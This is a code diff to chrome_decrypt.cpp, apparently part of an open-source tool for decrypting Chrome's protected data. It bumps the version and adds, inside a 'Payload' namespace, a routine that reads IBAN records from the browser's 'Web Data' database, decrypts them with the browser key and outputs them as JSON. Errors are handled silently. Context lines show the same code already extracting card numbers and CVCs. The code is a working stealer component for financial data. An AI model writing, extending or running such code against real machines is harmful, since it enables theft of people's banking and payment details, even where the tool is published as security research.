@@ -1,5 +1,5 @@
 // chrome_decrypt.cpp
-// v0.16.0 (c) Alexander 'xaitax' Hagenah
+// v0.16.1 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
@@ -400,6 +400,45 @@ namespace Payload
                             ",\"expiration_year\":" + std::to_string(sqlite3_column_int(stmt, 3)) +
                             ",\"card_number\":\"" + Utils::EscapeJson(card_num_str) +
                             "\",\"cvc\":\"" + Utils::EscapeJson(cvc_str) + "\"}";
+                 }},
+                {"Web Data", "iban", "SELECT guid, value_encrypted, nickname FROM local_ibans;",
+                 [](sqlite3 *db) -> std::optional<std::any>
+                 {
+                     auto encryptedMap = std::make_shared<std::unordered_map<std::string, std::vector<uint8_t>>>();
+                     sqlite3_stmt *stmt = nullptr;
+                     if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_ibans;", -1, &stmt, nullptr) != SQLITE_OK)
+                         return encryptedMap;
+
+                     while (sqlite3_step(stmt) == SQLITE_ROW)
+                     {
+                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
+                         const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 1);
+                         if (guid && blob)
+                             (*encryptedMap)[guid] = {blob, blob + sqlite3_column_bytes(stmt, 1)};
+                     }
+                     sqlite3_finalize(stmt);
+                     return encryptedMap;
+                 },
+                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
+                 {
+                     const auto &encryptedMap = std::any_cast<std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>>>(state);
+                     std::string value_str;
+                     try
+                     {
+                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
+                         if (guid && encryptedMap->count(guid))
+                         {
+                             auto plain = Crypto::DecryptGcm(key, encryptedMap->at(guid));
+                             value_str.assign((char *)plain.data(), plain.size());
+                         }
+                     }
+                     catch (...)
+                     {
+                         // handle errors silently
+                     }
+
+                     return "{\"nickname\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 2)) +
+                            "\",\"value\":\"" + Utils::EscapeJson(value_str) + "\"}";
                  }}};
             return configs;
         }
